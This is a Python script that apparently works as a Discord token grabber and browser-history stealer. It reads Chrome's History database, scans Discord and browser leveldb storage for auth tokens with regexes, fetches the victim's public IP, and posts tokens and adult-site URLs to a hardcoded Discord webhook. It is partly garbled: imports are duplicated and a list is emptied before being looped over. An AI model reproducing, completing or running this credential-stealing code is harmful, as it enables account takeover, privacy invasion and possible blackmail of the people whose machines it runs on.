import os
import re
import json
import requests
from urllib.request import Request, urlopen
import sqlite3

wh_url = "https://discord.com/api/webhooks/1213517165752492144/-dvwI93Lok88wnx3h5oo9z9FmQN7RzQSVlSyebVvQiZwj0_aeKhRzMzErAcOsmRwfFrs" # Too lazy
ip_url = "https://ipinfo.io/json"
base_url = "https://discord.com/channels/@me"

req = Request(ip_url, headers={'User-Agent': 'Mozilla/5.0'})
ipinfo = urlopen(req).read()
ipinfo = json.loads(ipinfo)
public_ip = ipinfo['ip']


tokens=[]
token=""
  


try:

            full_path = os.environ['LOCALAPPDATA'] + "\\Google\\Chrome\\User Data\\Default\\" + "History"
            # Open with SQLite
            conn = sqlite3.connect(full_path)
            cursor = conn.cursor()
            # Print all tables in the database to figure out the table name as for its not urls
            # cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
            # Get links
            links = []
            for row in cursor.execute("SELECT url FROM urls"):
                links.append(row[0])
except:
        pass



 
import os
import re
import json
from urllib.request import Request, urlopen

# your webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1213517165752492144/-dvwI93Lok88wnx3h5oo9z9FmQN7RzQSVlSyebVvQiZwj0_aeKhRzMzErAcOsmRwfFrs'

# mentions you when you get a hit

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone'

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message, 'username': 'AXRS'})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass




link=links
links=[]
for url in links:
   if (("porn") in url or ("hentai") in url or ("r34") in url or ("balls") in url ):
     links.append(url)
  


embed={
    "username": "AXRS",
    "content": f" **History**: ```{links}```"
  }

  # Send via requests and webhook url
requests.post(wh_url, data=embed)
main()


